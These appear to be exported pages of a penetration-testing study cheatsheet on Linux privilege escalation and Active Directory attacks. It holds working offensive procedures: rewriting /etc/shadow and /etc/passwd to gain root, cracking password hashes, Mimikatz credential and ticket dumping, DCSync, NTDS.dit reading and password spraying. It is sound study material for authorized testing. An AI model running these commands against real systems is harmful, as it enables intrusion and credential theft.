pages.html:
Linux Privesc

First pass: identity, delegated commands and privileged consumers

id
hostname
sudo -l
getcap -r /usr/bin /usr/sbin /bin /sbin /usr/local 2>/dev/null
systemctl list-timers --all
cat /etc/crontab
  • sudo -l: read the run-as identity, exact permitted arguments, authentication requirement and command behavior. A permitted program must expose a useful operation in that context.
  • Capabilities: inspect the specific executable and capability. Their presence alone does not mean an arbitrary shell becomes root.
  • Timers/cron: find the executed unit/script and its run-as account, then check whether you control that file or a consumed input. Timer visibility and unit inspection can be incomplete under restricted access.
namei -l /PATH/TO/SCRIPT
ls -l /PATH/TO/SCRIPT

A writable script matters when a privileged consumer actually executes it. If LinPEAS already reported a category, avoid repeating the whole inventory; manually verify the selected object, permissions and trigger. Confirm any changed privilege using id, then use the proof/evidence checkpoint.

A timer or service points at a candidate script 
systemctl cat SERVICE.service
systemctl show SERVICE.service -p User -p Group -p ExecStart -p FragmentPath
namei -l /PATH/TO/SCRIPT

Inspect the actual unit, drop-ins, interpreter and consumed file; a writable parent directory may matter even when the script itself is not writable. A root consumer and a controllable input still need a reachable trigger. If a relative command is used, establish the consumer's actual PATH rather than assuming it matches your shell. For a sudo/capability finding, use the permission-specific procedure and the matching GTFOBins context; an ordinary shell example is not interchangeable with its sudo/SUID/capability form.

If these checks leave no lead, inspect readable application configuration, backups and shell history, then review local listeners and routes. A localhost-only service needs its application/authentication checked; a new route or forwarded connection alone is not an exploit.

Automated first pass: linPEAS

Use one reviewed linPEAS build already transferred to the host. Run from a writable private directory:

bash ./linpeas.sh > linpeas.txt 2>&1
less -R linpeas.txt

Review sudo, file capabilities, SUID programs, services, scheduled execution and credential locations. A highlighted path is a candidate: inspect its actual permissions, the privileged consumer and the trigger before choosing an escalation method below. Do not rerun every static check merely because another script implements it.

This replaces the routine linPEAS → LSE → LinEnum sequence. It does not replace manual sudo -l, permission validation, reading application files or establishing exploit prerequisites. LinEnum is removed from the routine set because no required unique workflow was identified in these notes.

Transfer linPEAS or use an architecture-specific release

Use the transfer baseline to serve an already obtained script/build from Kali, download it to a writable target directory and compare hashes. The transfer page includes a wget fallback when curl is unavailable. Download and inspect the file before execution.

For an existing Linux amd64 release build matching the host:

uname -m
chmod +x ./linpeas_linux_amd64
./linpeas_linux_amd64 > linpeas.txt 2>&1
less -R linpeas.txt

Choose the actual host OS/architecture asset from PEASS releases. A release binary is an alternative packaging/execution context, not another mandatory scan. An exec-format error or execution denial is not a clean host assessment. Upstream linPEAS usage.

Watch a recurring process: pspy

Use this when the missing evidence is what executes, as whom, or with which arguments. Choose the binary for the host architecture:

chmod +x ./pspy64
./pspy64 -p -i 1000 | tee pspy.txt

Observe across the suspected schedule; Ctrl+C stops collection. A UID and command line can identify a privileged consumer, but you still need control over its input and a usable trigger. No event in a short observation window does not rule out a task. pspy releases and options.

Bound a process-observation window 
timeout --signal=INT 120s ./pspy64 -p -i 1000 > pspy-window.txt 2>&1

Read pspy-window.txt. The timeout normally returns 124 after the window; that is not proof the collector failed or no task exists. Choose a window covering the suspected schedule. If timeout is unavailable, use the interactive command above and stop it manually.

LSE fallback: progressive output when the broad linPEAS pass is unsuitable

Use the reviewed Linux Smart Enumeration script instead of running a second full static pass by habit:

bash ./lse.sh -l 0
bash ./lse.sh -l 1
bash ./lse.sh -l 2 -s usr010,net,pro

Escalate verbosity only for a remaining question. -s selects test IDs or sections; the last command requests one user test plus network/process sections instead of another whole inventory. Use the current script's help for available IDs. This is a presentation/runtime fallback, not proof that every linPEAS check was reproduced.

Kernel Exploits

Locating and utilizing kernel exploits is typically a straightforward process:

  • Perform enumeration to identify the kernel version (using a command such as "uname -a").
  • Search for relevant exploits that match the kernel version on search engines like Google, ExploitDB, or GitHub.
  • Compile and execute the exploit, but exercise caution as kernel exploits can be unstable, single-use only, and may cause system crashes.
  1. Enumerate the kernel version:
uname -a
    Linux debian 2.6.32-5-amd64 1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
  1. Use searchsploit to find matching exploits:
searchsploit linux kernel 2.6.32 priv esc
  1. We can try and adjust our search to be less specific with the kernel version, but more specific with the distribution:
searchsploit linux kernel 2.6 priv esc debian
  1. Obtain Linux Exploit Suggester 2 and inspect its suggestions for the original kernel version: 
./linux-exploit-suggester-2.pl -k 2.6.32

Service Exploits

To display all processes that are currently running with root privileges, use the following command:

ps aux | grep "^root"

With any results, try to identify the version number of the program being executed.

Running the program with the --version/-v command line option often shows the version number:

<program> --version
<program> -v

On Debian-like distributions, dpkg can show installed programs and their version:

dpkg -l | grep <program>

On systems that use rpm, the following achieves the same:

rpm -qa | grep PROGRAM

Port Forwarding

In certain cases, a root process may be linked to an internal port for communication purposes. If, for any reason, you cannot run an exploit on the target machine itself, you can forward the port to your local machine using SSH:

ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>

The exploit code can now be run on your local machine at whichever port you chose.

Weak File Permissions

Find all writable files in /etc:

find /etc -maxdepth 1 -writable -type f

Find all readable files in /etc:

find /etc -maxdepth 1 -readable -type f

Find all directories which can be written to:

find / -executable -writable -type d 2> /dev/null

World Readable /etc/shadow

  1. Check the permissions of the /etc/shadow file and note that it is world readable:
ls -l /etc/shadow
    -rw-r--r-- 1 root shadow 810 May 13 2017 /etc/shadow
  1. Extract the root user’s password hash:
head -n 1 /etc/shadow
    root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXv
    RDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
  1. Save the password hash in a file (e.g. hash.txt):
echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt
  1. Crack the password hash using john:
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
  1. Use the su command to switch to the root user, entering the password we cracked when prompted:
su
Password:
root@debian:/# id
uid=0(root) gid=0(root) groups=0(root)

World Writable /etc/shadow

  1. Check the permissions of the /etc/shadow file and note that it is world writable:
ls -l /etc/shadow
    -rw-r--rw- 1 root shadow 810 May 13 2017 /etc/shadow
  1. Copy / save the contents of /etc/shadow so we can restore it later.
  2. Generate a new SHA-512 password hash:
mkpasswd -m sha-512 newpassword
    $6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VE
    WwO/okK3vi1IdVaO9.xt4IQMY4OUj/
  1. Edit the /etc/shadow and replace the root user’s password hash with the one we generated.
root:$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoO
lL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/:17298:0:99999:7:::
  1. Use the su command to switch to the root user, entering the new password when prompted:
su
Password:
root@debian:/# id
uid=0(root) gid=0(root) groups=0(root)

World Writable /etc/passwd

The root account in /etc/passwd is usually configured like this:

root:x:0:0:root:/root:/bin/bash

The “x” in the second field instructs Linux to look for the password hash in the /etc/shadow file.

In some versions of Linux, it is possible to simply delete the “x”, which Linux interprets as the user having no password:

root::0:0:root:/root:/bin/bash

  1. Check the permissions of the /etc/passwd file and note that it is world writable.:
ls -l /etc/passwd
    -rw-r--rw- 1 root root 951 May 13 2017 /etc/passwd
  1. Generate a password hash for the password “password” using openssl:
openssl passwd "password"
    L9yLGxncbOROc
  1. Edit the /etc/passwd file and enter the hash in the second field of the root user row:
root:L9yLGxncbOROc:0:0:root:/root:/bin/bash
  1. Use the su command to switch to the root user:
su
Password:
# id
uid=0(root) gid=0(root) groups=0(root)
  1. Alternatively, append a new row to /etc/passwd to create an alternate root user (e.g. newroot):
newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash
  1. Use the su command to switch to the newroot user:
su newroot
Password:
# id
uid=0(root) gid=0(root) groups=0(root)

SUIDs and GUIDs

We can use find to locate SUID programs and discover which programs are SUID:

find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

Next we can use this source to find exploitable methods of the found binary:

GTFO Bins:

Open resource

Stored Passwords

View the contents of hidden files in the user’s home directory:

$ cat ~/.*history | less
ls -al
cat .bash_history
ls -al
mysql -h somehost.local -uroot -ppassword123

You can also check for configuration files inside the OS.

NFS

Show the NFS server’s export list:

$ showmount -e <target>

Similar Nmap script:

nmap -sV --script=nfs-showmount TARGET

Mount an NFS share:

$ mount -o rw,vers=2 <target>:<share> <local_directory>

Prepare tools used on this page

Run setup on Kali after preparing the shared workspace. Skip a clone when its checkout already exists; review/update it deliberately rather than cloning over it. Operational commands remain in the sections above.

Prepare pspy

Runs on a Linux x64 target. Static upstream binary; choose pspy32 for i386. Only its help is suitable for a local preparation check; monitoring belongs to the target procedure. Upstream.

curl -fL https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -o "$HOME/oscp/tools/artifacts/linux/x64/pspy64"
chmod u+x "$HOME/oscp/tools/artifacts/linux/x64/pspy64"

Check on Kali:

file "$HOME/oscp/tools/artifacts/linux/x64/pspy64"
Prepare Linux Smart Enumeration

Alternative Linux shell collector; retain its script rather than running a second full inventory by habit. Upstream.

git clone --depth 1 https://github.com/diego-treitos/linux-smart-enumeration.git "$HOME/oscp/tools/repos/linux-smart-enumeration"
cp "$HOME/oscp/tools/repos/linux-smart-enumeration/lse.sh" "$HOME/oscp/tools/artifacts/linux/lse.sh"

Check on Kali:

bash -n "$HOME/oscp/tools/artifacts/linux/lse.sh"
Prepare Linux Exploit Suggester 2

Optional target-side Perl script; the target needs Perl. Matching a kernel string does not account for every distribution backport. Upstream.

git clone --depth 1 https://github.com/jondonas/linux-exploit-suggester-2.git "$HOME/oscp/tools/repos/linux-exploit-suggester-2"
cp "$HOME/oscp/tools/repos/linux-exploit-suggester-2/linux-exploit-suggester-2.pl" "$HOME/oscp/tools/artifacts/linux/linux-exploit-suggester-2.pl"

Check on Kali:

perl -c "$HOME/oscp/tools/artifacts/linux/linux-exploit-suggester-2.pl"

pages.html:
Active Directory

Start with your identity and domain context

Run these from a Windows domain member with a domain logon:

whoami /all
echo %USERDOMAIN%
echo %LOGONSERVER%
net user /domain
net group /domain
net accounts /domain

Inspect a selected identity/group rather than dumping every object's properties:

net user USER /domain
net group "GROUP NAME" /domain

Choose the next AD page

  • Need names, groups, computers or SPNs: manual enumeration.
  • Need relationship collection: automatic enumeration; validate useful graph edges against the actual object and your effective rights.
  • Have a hash, ticket or password: authentication; distinguish an NT hash from a challenge-response capture and a TGT from a service ticket.
  • Have valid credentials: lateral movement; test the particular host and transport. Successful SMB login does not imply local administrator or WinRM/RDP rights.
  • Have a roasting/ticket clue: Kerberos; verify domain DNS, DC reachability, clock alignment and the selected account's conditions first.

Directory ACL, GPO and AD CS findings require a controlled object plus a usable privileged consumer or enrollment path. Check the exact right/template requirements before choosing an attack; generic write access somewhere in the domain is insufficient. After obtaining a new identity, repeat group, object-right and host-access checks.

headings.text: Start with your identity and domain context

pages.title: AD Manual Enumeration
pages.html:
AD Manual Enumeration

Users / Groups / Computers

  • Look for users with high-privs across the domain e.g. Domain Admins or Derivative Local Admins
  • Look for custom groups.
# get a list of all users in the domain
cmd> net user /domain
PS > Get-NetUser | select cn # Using PowerView.ps1

# get details about a specific user 
cmd> net user [username] /domain # more than 10 group memberships, cmd will fail
PS > Get-ADUser -Identity <username> -Server asd.domain.com -Properties * # Powershell

# get list of all groups in the domain
cmd> net group /domain
PS > Get-ADUser -Filter 'Name -like "*lorenzo"' -Server asd.domain.com | Format-Table Name,SamAccountName -A
PS > Get-NetGroup -GroupName * # Using PowerView.ps1

# enumerate AD groups
PS > Get-ADGroup -Identity Administrators -Server asd.domain.com

# get details such as membership to a group
cmd> net group [groupname] /domain
PS > Get-ADGroupMember -Identity Administrators -Server domain.com # Powershell

# get the password policy of the domain
cmd> net accounts /domain

# get all AD objects that were changed after a specific date
PS > $ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
PS > Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server asd.domain.com

# enumerate accounts that have a badPwdCount that is greater than 0
# useful to avoid these accounts in our bruteforce attacks
PS > Get-ADObject -Filter 'badPwdCount -gt 0' -Server domain.com

# get additional information about the specific domain
PS> Get-ADDomain -Server asd.domain.com

# get all computers in domain
cmd> net view
cmd> net view /domain

# get resources/shares of specified computer
cmd> net view \\[computer_name] /domain

# get a list of all operating systems on the domain 
PS > Get-NetComputer -fulldata | select operatingsystem # Using PowerView.ps1

Domain Controller hostname (PdcRoleOwner)**

PS> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

This PowerShell script will collect all users along with their attributes:

$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    Write-Host "------------------------"
}

In the filter property, we can set any attribute of the object type we desire. For example, we can use the name property to create a filter for the Jeff_Admin user as shown below:

$Searcher.filter="name=Jeff_Admin"

Nested Groups

For a candidate exposed by collection, query the exact group/object instead of repeating the entire directory inventory. See object-rights validation when membership or an ACL is the missing prerequisite.

Locate all groups in the domain and print their names:

$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(objectClass=Group)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    $obj.Properties.name
}

List the members of a group by setting an appropriate filter on the name property. In addition, we will only display the member attribute to obtain the group members.

$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(name=GROUPNAME)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    $obj.Properties.member
}

Logged-in users and active user sessions

  • More powerview commands https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview
PS> Set-ExecutionPolicy Unrestricted
PS> Import-Module .\PowerView.ps1
PS> Get-NetLoggedon -ComputerName [computer_name]    # enum logged-in users
PS> Get-NetSession -ComputerName [domain_controller] # enum active user sessions

Service Principal Names (AD Service Accounts)

  • A SPN is a unique name for a service on a host, used to associate with an Active Directory service account.
  • Enum SPNs to obtain the IP address and port number of apps running on servers integrated with Active Directory.
  • Query the Domain Controller in search of SPNs.
  • SPN Examples
    • CIFS/MYCOMPUTER$ - file share access.
    • LDAP/MYCOMPUTER$ - querying AD info via. LDAP.
    • HTTP/MYCOMPUTER$ - Web services such as IIS.
    • MSSQLSvc/MYCOMPUTER$ - MSSQL.

For example, let's update our PowerShell enumeration script to filter the serviceprincipalname property for the string *http*, indicating the presence of a registered web server:

$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
}

  • Perform nslookup of the service hostname -> see if there is an entrypoint here.

  • Automated SPN enum scripts:

# Kerberoast: https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
PS> .\GetUserSPNs.ps1

# Powershell Empire: https://github.com/compwiz32/PowerShell/blob/master/Get-SPN.ps1
PS> .\Get-SPN.ps1

Validate control over a specific AD object

Use the reviewed PowerView module under the current domain identity. TARGET_OBJECT is the user, group or computer identified by enumeration:

Import-Module .\PowerView.ps1
Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs | Select-Object SecurityIdentifier,ActiveDirectoryRights,ObjectAceType,AceType,IsInherited
whoami /user
whoami /groups

Compare the ACE trustee with your identity and effective groups. GenericAll, GenericWrite, WriteDacl, WriteOwner and a specific extended right enable different actions; inspect object type, property/GUID, deny ACEs and inheritance. Seeing a right in someone else's ACE does not grant it to you.

  • Control of a user/group → password reset or group membership.
  • Control of a computer/delegation attribute → delegation prerequisites.
  • A CA/template clue → AD CS prerequisites; a published template alone is not an escalation.
  • Delegated password-read rights → LAPS/gMSA checks.

PowerView ACL query. Keep writes and cleanup in the selected procedure; do not modify every interesting object.

Prepare tools used on this page

Use the shared Kali workspace preparation first. Optional tools are not additional mandatory passes. Skip a clone when its reviewed checkout already exists.

Prepare RSAT Active Directory PowerShell

Runs on an owned Windows 10/11 Pro or Enterprise management host, not Kali. Install from elevated PowerShell only when you administer that host; a low-privilege domain shell does not imply this feature is available. This feature is required for the Get-AD* examples, not for PowerView or the native LDAP helper. Upstream.

Get-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools*
Add-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0

Check on the Windows management host:

Get-Module -ListAvailable ActiveDirectory
Import-Module ActiveDirectory
Get-Command Get-ADUser

On Windows Server, use elevated PowerShell instead:

Install-WindowsFeature RSAT-AD-PowerShell
Import-Module ActiveDirectory
Get-Command Get-ADUser

If you cannot install RSAT, use the existing LDAP/PowerView methods rather than assuming Get-ADUser is a built-in cmdlet.

Prepare Kerberoast scripts and tgsrepcrack

Retained legacy PowerShell SPN-enumeration alternative. The actual script referenced here is GetUserSPNs.ps1; this does not install obsolete cracking scripts. Prefer the existing Impacket/Rubeus owner for ticket requests; these mechanisms have distinct prerequisites. Upstream.

pages.html:
AD Automatic Enumeration

Choose the missing information. Do not run every LDAP/SMB collector for identical users and groups under the same identity.

Relationship graph: SharpHound and BloodHound CE

Use SharpHound compatible with your deployed BloodHound CE. On a Windows domain-authenticated collection host, use working DNS and the selected reachable DC:

.\SharpHound.exe --collectionmethods DCOnly --domain DOMAIN --domaincontroller DC_HOST --outputdirectory C:\Evidence --zipfilename ad-directory.zip --memcache

Replace DOMAIN with the DNS domain and DC_HOST with its DC; use an existing writable output directory. Import the generated *ad-directory.zip through that BloodHound version's ingestion interface; the filename may carry a timestamp prefix. Read collection errors as well as the ZIP contents. Review memberships and rights from your identity, then validate useful edges.

This replaces All-by-default and the obsolete Neo4j/Electron startup instructions. DCOnly does not establish current sessions, local-admin access or member-host execution rights. Retain focused host/session collection when a path depends on it: complete domain-mapping variants.

Retained host facts: local groups and a session snapshot

Put only the evidence-backed, assigned host FQDNs in candidate-hosts.txt, one per line. With a collector compatible with the installed CE version:

.\SharpHound.exe --CollectionMethods LocalGroup --ComputerFile .\candidate-hosts.txt --OutputDirectory C:\Evidence --ZipFileName candidate-localgroups.zip
.\SharpHound.exe --CollectionMethods Session --ComputerFile .\candidate-hosts.txt --OutputDirectory C:\Evidence --ZipFileName candidate-sessions.zip

These are separate host/API reads with their own permissions and connectivity requirements. Denied or empty session output is inconclusive; sessions are volatile. Group membership is not proof that a chosen remote transport permits execution. Do not add an All run just to obtain these two views.

Readable inventory from Kali: ldapdomaindump

Choose this for readable users/groups/computers/policies when you do not already have that inventory. It is not a rights graph:

ldapdomaindump --minimal -u 'DOMAIN\USER' -o ldap-inventory DC_HOST

Use the NetBIOS domain in DOMAIN\USER; upstream prompts for the password. Read the domain_users, domain_groups, domain_computers and policy reports. Missing attributes or denied reads remain gaps. Do not enable extra hostname resolution by default. Upstream.

Native fallback: our AD surface helper

When the graph workflow or third-party collector is unavailable, copy the entire scripts/ad-map directory. From Windows PowerShell 5.1 with usable domain authentication:

.\scripts\ad-map\Invoke-ADMap.ps1 -Server DC_HOST -Domain DOMAIN

Read next-checks.md, raw.json and queries.csv in the printed private directory. Accounts/groups/delegation/policy/AD CS metadata and visible object DACLs generate candidate clues and missing checks. This is not BloodHound's graph or effective-access calculation: nested groups, object-specific rights, deny effects and remote sessions require further validation.

[SUMMARY] lists the returned query counts and candidate clues; [GAPS] identifies failed/limited/partial reads. Start with one clue's evidence and missing check. Returned means that query returned, not that the directory is fully visible. A failed initial RootDSE/domain check stops collection; fix endpoint, authentication or domain context before interpreting absence of findings. Keep the whole ad-map directory together; the entry script needs ADMap.psm1.

Use explicit network credentials or a focused saved pass

An SSH/remote logon can have a usable local token without reusable network credentials. Supply one known identity instead of assuming delegation:

$Credential = Get-Credential -UserName 'USER@DOMAIN'
.\scripts\ad-map\Invoke-ADMap.ps1 -Server DC_HOST -Domain DOMAIN -Credential $Credential -Module Accounts,Groups,Policies -OutputDirectory "$env:LOCALAPPDATA\ADMap\directory-pass1" -SummaryLimit 8

Here DOMAIN is the DNS domain; the output directory must be new and local. -Preview prints the selected query plan without a bind or credential prompt. -SummaryLimit 20 shows more clues without changing saved findings. -MaxResults 2000 is a per-query object cap, not a completeness guarantee; reaching it produces PossiblyLimited. To use the current Windows network identity instead, omit -Credential. Do not place passwords in command lines.

For a specifically missing metadata question, avoid another broad pass:

.\scripts\ad-map\Invoke-ADMap.ps1 -Server DC_HOST -Domain DOMAIN -Module ADCS

Template flags alone do not prove a certificate attack. Setup and limits.

Retain manual LDAP for precise objects/attributes, SMB/RPC for its service view and real host-access checks after obtaining a new identity. A new credential or route justifies targeted re-enumeration.

Prepare tools used on this page

Run setup on Kali after preparing the shared workspace. Skip a clone when its checkout already exists; review/update it deliberately rather than cloning over it. Operational commands remain in the sections above.

Prepare ldapdomaindump

Runs on Kali. Readable LDAP inventory; credentials/connectivity are supplied only when using the procedure. Upstream.

sudo apt install python3-ldapdomaindump

Check on Kali:

ldapdomaindump --help
Prepare SharpHound

Runs on a Windows collection host. Keep companion files and match the collector to the installed BloodHound CE ingestion version. Upstream.

sudo apt install sharphound
cp -a /usr/share/sharphound "$HOME/oscp/tools/artifacts/windows/"

Check on Kali:

file "$HOME/oscp/tools/artifacts/windows/sharphound/SharpHound.exe"
Prepare BloodHound

Optional local AD graph service using the upstream CE quickstart, not the old Electron startup sequence. Requires Docker/Compose, at least 8 GB RAM and about 10 GB free storage. CLI installation is interactive and starts local containers; record its generated credentials privately and change them on first login. If port 8080 is occupied, use the CLI configuration rather than stopping unrelated services. Upstream.

sudo apt install docker.io docker-compose-v2
sudo systemctl start docker
mkdir -p "$HOME/oscp/tools/repos/bloodhound-ce"
cd "$HOME/oscp/tools/repos/bloodhound-ce"
curl -fL https://github.com/SpecterOps/bloodhound-cli/releases/download/v0.2.1/bloodhound-cli-linux-amd64.tar.gz -o "$HOME/oscp/tools/downloads/bloodhound-cli.tar.gz"

sudo ./bloodhound-cli install

Check on Kali:

sudo docker ps
curl -I http://127.0.0.1:8080

Use the official CE quickstart for installation prompts, version matching, start/stop and recovery. Confirm the web login before collecting domain data; docker ps alone does not prove the application is ready.

AD Authentication

Replicate one account only after confirming domain replication rights

DCSync requires effective directory replication rights on the domain naming context, commonly DS-Replication-Get-Changes and DS-Replication-Get-Changes-All; filtered attributes may require the filtered-set right. Local administrator on a member server alone is insufficient. Validate the trustee and scope through object ACLs first.

impacket-secretsdump -just-dc-user TARGET_USER -dc-ip DC_IP 'DOMAIN/USER@DC_HOST'

The credential prompt is for the caller USER; TARGET_USER is the selected account to replicate. Requires reachable DC RPC/DRSUAPI endpoints and a working domain identity. A returned account NT hash is credential material, not an interactive logon; continue with credential context and access checks. Access denied calls for rights/context verification, not a broad dump or a DC password reset. Impacket options and replication-rights procedure.

Dumping NTLM Hashes and Plaintext Credentials

NTLM authenticates through a challenge/response derived from account key material; the response is not the NT hash itself. Local accounts can be validated by the destination and domain accounts by the applicable domain authentication path.

Dumping LM/NTLM hashes with Mimikatz

  • Full Mimikatz Guide
  • Local credential/LSASS access requires the relevant elevated token, enabled privileges and an accessible process/store. Administrator membership alone does not bypass integrity, protected-process or Credential Guard restrictions.
# request the debug privilege / attempt permitted token impersonation; verify the result


mimikatz > privilege::debug
mimikatz > token::elevate

# dump NTLM hashes + plaintext creds
mimikatz.exe lsadump::secrets "vault::cred /patch" lsadump::sam
mimikatz > lsadump::secrets
mimikatz > vault::cred /patch
mimikatz > lsadump::sam              # dump contents of SAM db in current host
mimikatz > sekurlsa::logonpasswords  # dump creds of logged-on users

Other tools

cmd> pwdump.exe localhost
cmd> fgdump.exe localhost          # improved pwdump, shutdown firewalls 
cmd> type C:\Windows\NTDS\NTDS.dit # all domain hashes in NTDS.dit file on the Domain Controller

Dumping Kerberos Tickets

Kerberos authentication uses a ticketing system, where a Ticket Granting Ticket (TGT) is issued by the Domain Controller (with the role of Key Distribution Center (KDC)) and is used to request tickets from the Ticket Granting Service (TGS) for access to resources/systems joined to the domain.

  • Hashes are stored in the Local Security Authority Subsystem Service (LSASS).
  • LSASS process runs as SYSTEM, so we need SYSTEM / local admin to dump hashes stored on target.

Current-logon ticket inspection/export, inside a reviewed Mimikatz build:

kerberos::list /export

This does not inherently require reading other logon sessions. For deliberately authorized elevated access to LSASS tickets:

privilege::debug
sekurlsa::tickets /export

A successful debug-privilege request is not automatically SYSTEM access or a bypass of process protection. Ticket exports retain principal, TGT/TGS type, target SPN, lifetime and encryption; plaintext passwords are not guaranteed to be present. Continue with the ticket import/cache procedure, then verify the destination's permitted operation.

Prepare tools used on this page

Use the shared Kali workspace preparation first. Optional tools are not additional mandatory passes. Skip a clone when its reviewed checkout already exists.

Prepare FreeRDP

FreeRDP 3 client used in the RDP/drive-transfer variants. A minimal/custom image may not have it even if older notes assume xfreerdp. The /version check requires no target. Upstream.

sudo apt install freerdp3-x11

Check on Kali:

xfreerdp3 /version
Prepare Remmina

Optional graphical RDP client on Kali; requires a desktop session when used. Prefer one chosen RDP client, not repeated attempts through every GUI. Upstream.

sudo apt install remmina

Check on Kali:

remmina --version

AD Lateral Movement

Useful Powershell one-liners.

Useful lateral movement techniques.

Abusing Kerberos using Impacket.

Kerberos attack cheatsheet.

ZeroLogon Vulnerability

Conditional legacy DC vulnerability: verify configuration and recovery first

CVE-2020-1472 concerns vulnerable Netlogon behavior on affected, unpatched domain controllers. DC role, patch/enforcement state and configuration matter; a Windows Server banner is not sufficient evidence.

Resetting a DC machine-account password can break domain operations. Use a complete, reviewed attack and restoration plan before considering that mutation. The upstream exploit and restoration guidance explains the account/database consistency issue; a reset snippet followed by a dump is not a recovery procedure. For already granted domain replication rights, use DCSync without a DC password reset.

Password Spraying

Use one selected candidate password and known usernames only after checking applicable domain/fine-grained lockout policies, recent failures and account restrictions. A default domain policy alone does not establish a safe attempt budget.

nxc smb HOST -d DOMAIN -u /PATH/users.txt -p 'PASSWORD' -t 1 --continue-on-success

This tests one password across the selected users on one host. One worker limits concurrency, not accumulated failures across DCs, hosts or previous runs. Stop on lockout or transport errors; do not cycle additional passwords as routine enumeration. Accepted SMB credentials still need operation-specific permissions checked. NetExec spraying options.

RDP separately needs permitted remote-interactive logon and compatible endpoint/client configuration. A valid password is not sufficient. Use remote-access validation before RDP-specific guessing.

Plaintext Credentials

For an already reachable WinRM service, use the recovered identity without changing target configuration:

evil-winrm -i TARGET -u 'DOMAIN\USER'

Enter the known password at the prompt. Requires WinRM access rights (for example an applicable Remote Management Users or Administrators membership), not just a successful SMB login. In the shell, run hostname and whoami /all to establish the host and token. A WinRM authorization denial is not automatically a bad password. Evil-WinRM usage.

The existing WinRM endpoint uses HTTPS 
evil-winrm -i TARGET -u 'DOMAIN\USER' -S -P 5986

Use the actual configured TLS port; do not enable another endpoint merely to match an example.

Other existing RDP and WinRS clients

Use an existing reachable endpoint and an account authorized for that service. A Windows WinRS client also needs the appropriate authentication/trust configuration; do not enable unencrypted traffic or trust every host as a default workaround.

# RDP clients
$ rdesktop [target] -d [domain] -u [user] -p [password]
$ remmina -c rdp://[username]:[password]@[target]

winrs -r:HOST -u:DOMAIN\USER -p:PASSWORD "cmd /c hostname & whoami"

# Admin groups but with a "MANDATORY LABEL\MEDIUM" context?
# Try UAC bypass technique.
# See https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-main.md#user-account-control-uac-bypass

Service Account Attacks

An SPN identifies a service/account relationship; it does not grant access by itself. For offline recovery from a requested service ticket use the selected-account Kerberoasting commands. Request/export and offline cracking are separate operations; ticket collection does not crack a password on the target.

For an acquired ticket use pass-the-ticket. With an obtained service key and compatible target validation, use silver tickets. Retain the exact principal and SPN with the material.

Pass the Hash

Requires the account's NT hash and a destination/protocol that accepts that identity using NTLM. A Net-NTLMv2 response is not a reusable NT hash. Required rights depend on the operation.

